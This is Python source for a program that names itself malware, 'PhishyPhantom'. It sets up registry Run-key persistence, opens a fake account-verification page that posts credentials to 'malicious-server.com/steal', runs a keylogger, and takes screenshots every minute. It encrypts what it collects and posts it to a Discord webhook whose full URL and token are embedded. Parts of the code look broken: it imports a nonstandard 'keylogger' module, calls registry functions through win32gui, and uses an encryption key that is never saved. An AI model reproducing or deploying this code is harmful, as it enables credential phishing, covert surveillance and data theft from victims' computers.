import os
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import keylogger
import threading
import socket
import requests
import json
from cryptography.fernet import Fernet
import subprocess
import win32gui
import win32con

class PhishyPhantom:
    def __init__(self):
        self.webhook_url = "https://discord.com/api/webhooks/1403896533489025095/6TTtZVRLATLi8h5excj_HdaRTr5ERJXfyYCOGAVSExp_wSCohfOUBtZdmWq3-OHbt3rp"  # webhook de filho da puta 
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        self.smtp_creds = {
            "email": "your.phishy.email@example.com",
            "password": "P@ssw0rd123",
            "smtp_server": "smtp.example.com",
            "smtp_port": 587
        }

    def _encrypt_data(self, data):
        """Encrypt stolen data using Fernet symmetric encryption."""
        return self.cipher_suite.encrypt(data.encode())

    def _exfiltrate_data(self, data):
        """Send encrypted data to C2 server or webhook."""
        encrypted_data = self._encrypt_data(json.dumps(data))
        requests.post(
            self.webhook_url,
            files={"file": ("data.enc", encrypted_data)}
        )

    def _phish_credentials(self):
        """Spoof a fake login page and harvest credentials."""
        fake_page = """
        <html>
        <body>
            <h1>:warning: Your Account Requires Verification</h1>
            <form action="http://malicious-server.com/steal" method="POST">
                <input type="text" name="username" placeholder="Email">
                <input type="password" name="password" placeholder="Password">
                <button>Submit</button>
            </form>
        </body>
        </html>
        """
        with open("login.html", "w") as f:
            f.write(fake_page)
        subprocess.Popen(["start", "login.html"], shell=True)

    def _keylog_and_screenshot(self):
        """Log keystrokes and take screenshots periodically."""
        def keylog():
            kl = keylogger.Keylogger()
            kl.start()
        
        def screenshot():
            while True:
                subprocess.call(["nircmd.exe", "savescreenshot", "screen.png"])
                self._exfiltrate_data({"screenshot": open("screen.png", "rb").read()})
                threading.Event().wait(60)
        
        threading.Thread(target=keylog, daemon=True).start()
        threading.Thread(target=screenshot, daemon=True).start()

    def _persistence(self):
        """Achieve persistence via registry manipulation."""
        try:
            key = win32con.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            handle = win32gui.RegOpenKeyEx(key, subkey, 0, win32con.KEY_WRITE)
            win32gui.RegSetValueEx(handle, "PhishyPhantom", 0, win32con.REG_SZ, sys.executable)
        except Exception as e:
            self._exfiltrate_data({"error": str(e)})

    def run(self):
        """Orchestrate the malware's execution flow."""
        self._persistence()
        self._phish_credentials()
        self._keylog_and_screenshot()

if __name__ == "__main__":
    malware = PhishyPhantom()
    malware.run()